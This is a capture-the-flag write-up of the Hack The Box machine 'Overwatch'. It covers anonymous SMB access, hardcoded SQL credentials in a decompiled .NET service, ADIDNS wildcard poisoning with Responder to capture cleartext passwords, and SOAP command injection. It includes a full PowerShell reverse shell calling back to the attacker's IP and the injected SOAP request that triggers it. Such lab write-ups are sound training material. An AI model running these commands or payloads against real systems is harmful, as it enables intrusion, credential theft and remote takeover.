# HTB — Overwatch Writeup
[Here are the notes I took while solving](./Walkthrough)

## Recon

Starting off with a classic Nmap scan:

```
Starting Nmap 7.98 at 2026-01-27 05:56 -0500
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb)
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000
...
```

Classic Windows AD setup — DNS, Kerberos, LDAP, SMB, RDP, WinRM, and a SQL Server. No web server on standard ports though, which already narrows things down. I synced the clock with `sudo ntpdate -bu overwatch.htb` as always with Kerberos environments.

---

## SMB Enumeration → Hardcoded Credentials

Anonymous SMB access was available, and `smbmap` revealed something interesting:

```
smbmap -u anonymous -H overwatch.htb

Disk              Permissions
----              -----------
ADMIN$            NO ACCESS
C$                NO ACCESS
IPC$              READ ONLY
NETLOGON          NO ACCESS
software$         READ ONLY
SYSVOL            NO ACCESS
```

The `software$` share is non-standard and readable anonymously — let's grab everything:

```bash
smbget -U Anonymous 'smb://overwatch.htb/software$/Monitoring' --recursive
```

Inside I found a .NET executable along with its `.pdb` debug symbols. Popping it open with **ILSpy** in VSCode, I could decompile the whole thing. The app turned out to be a monitoring service (Cherwell Overwatch Service, built on `.NET v4.0.30319`) that scrapes Edge browsing history and logs it to a SQL database.

In the `CheckEdgeHistory` function, the database connection string was hardcoded:

```csharp
SqlConnection val = new SqlConnection(
    "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"
);
```

First creds: **`sqlsvc:TI0LKcfHzZw1Vv`**

---

## MSSQL Enumeration

The SQL port (6520) is exposed externally, so:

```bash
impacket-mssqlclient -windows-auth overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb -port 6520
```

It worked. Enumerating the instance:

```
SQL> enum_links

SRV_NAME             SRV_DATASOURCE
------------------   ------------------
S200401\SQLEXPRESS   S200401\SQLEXPRESS
SQL07                SQL07
```

Two linked servers, including a mysterious `SQL07`. I also noted that `msdb` is trustworthy and that `sqlsvc` owns the `overwatch` database, but the database itself was empty. No impersonation opportunities either.

I went down a Silver Ticket rabbit hole for a while — I had the service account password, computed the NTLM hash (`ED780EA18DA655DE0828A3BBBD9ED9F0`), grabbed domain info from BloodHound... but couldn't get it to work cleanly. BloodHound did flag **`ADAM.RUSSELL@OVERWATCH.HTB`** as a high-value target and gave me the domain SID `S-1-5-21-2797066498-1365161904-233915892`, but I pivoted away from this approach.

---

## ADIDNS Poisoning → Cleartext Password

I was stuck for a while. A Reddit hint pointed me toward **ADIDNS poisoning** — essentially DNS poisoning but targeting the AD-integrated DNS zone. The idea: if `SQL07` is resolved via AD DNS, and I can inject a wildcard DNS record pointing to my machine, then when the SQL server tries to connect to `SQL07`, it'll hit me instead — and since MSSQL linked server connections can use cleartext auth, Responder will catch the credentials in plaintext.

Here's the attack flow:

**Step 1** — Add a wildcard DNS record pointing to my IP using `dnstool`:

```bash
dnstool -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  --record '*' --action add --data 10.10.14.87 10.129.2.78
```
```
[+] Bind OK
[+] LDAP operation completed successfully
```

**Step 2** — Start Responder:

```bash
sudo responder -I tun0
```

**Step 3** — Connect to MSSQL and use the linked server:

```bash
impacket-mssqlclient -windows-auth overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@overwatch.htb -port 6520
SQL> use_link SQL07
```

**Step 4** — Watch Responder:

```
[MSSQL] Cleartext Client   : 10.129.2.78
[MSSQL] Cleartext Hostname : SQL07
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

Beautiful. New creds: **`sqlmgmt:bIhBbzMMnB82yx`**

I love this technique — it's elegant, it abuses a feature rather than a bug, and it's very realistic.

---

## User Flag — WinRM Access

BloodHound had already told me that `sqlmgmt` is a member of **Remote Management Users**, so:

```bash
evil-winrm -i overwatch.htb -u sqlmgmt -p bIhBbzMMnB82yx
```

We're in. User flag is sitting on the Desktop. ✅

---

## Privilege Escalation — SOAP Service Command Injection

Running WinPEAS flagged something:

```
overwatch(overwatch)[C:\Program Files\nssm-2.24\win64\nssm.exe]
- Autoload - No quotes and Space detected
```

I went chasing CVEs for nssm and found a reference to `CVE-2025-41686`, but there was essentially zero public information about it. Dead end.

I pivoted to enumerating local ports via **Ligolo**. After setting up the tunnel, a local Nmap scan revealed port **8000** open internally — exactly what I'd noticed earlier in `overwatch.exe.config`:

```xml
<add baseAddress="http://overwatch.htb:8000/MonitorService" />
```

Hitting the endpoint confirmed it: a **WCF SOAP service** was running. The page helpfully told me how to interact with it:

```
svcutil.exe http://overwatch.htb:8000/MonitorService?wsdl
```

Pulling the WSDL revealed the available operations. One immediately stood out: **`KillProcess`**, which takes a `processName` parameter. Back in the decompiled source (from our earlier ILSpy session), the implementation was:

```csharp
public string KillProcess(string processName)
{
    string scriptContents = "Stop-Process -Name " + processName + " -Force";
    // ... runs it via PowerShell Runspace
}
```

Classic string concatenation into a PowerShell command. Textbook injection. The input is never sanitized, so I can break out with a semicolon and inject arbitrary PowerShell.

I prepared a reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.87',9333);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Encoded it to Base64:

```bash
cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0
```

Then fired the SOAP request, injecting via the `processName` parameter to turn `Stop-Process -Name <input> -Force` into `Stop-Process -Name notepad; powershell -encodedcommand <b64>; echo -Force`:

```bash
curl -s -X POST http://overwatch.htb:8000/MonitorService \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <tns:KillProcess>
      <tns:processName>notepad; powershell -encodedcommand JABjAGwA...AAoA; echo</tns:processName>
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>'
```

On my listener:

```
nc -nlvp 9333
connect to [10.10.14.87] from (UNKNOWN) [10.129.3.163] 54727

whoami
nt authority\system
```

Root flag on the Administrator Desktop. ✅

---

## Conclusion

Overwatch was a genuinely enjoyable box. The reverse engineering angle added a nice twist — decompiling a .NET binary to find hardcoded credentials felt very CTF but also very real-world. The part that stumped me the most was the ADIDNS poisoning; I didn't know the existence of the technique and had to step away from the box for a few weeks before a hint nudged me in the right direction. Once I understood it though, it clicked immediately — it's a really elegant attack.

The privilege escalation was more straightforward once I remembered the service config from the very beginning of the box. Everything tied together neatly, which always makes for a satisfying solve.
